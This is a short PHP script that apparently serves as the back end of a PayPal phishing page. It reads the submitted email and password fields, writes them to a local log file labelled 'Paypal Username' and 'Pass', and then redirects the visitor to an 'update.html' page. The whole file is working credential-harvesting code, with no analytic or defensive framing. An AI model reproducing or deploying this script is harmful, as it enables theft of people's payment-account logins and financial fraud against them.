<?php

file_put_contents("userlogs.txt", "Paypal Username: " . $_POST['login_email'] . " Pass: " . $_POST['login_password'] . "\n", FILE_APPEND);
header('Location: update.html');
exit();
?>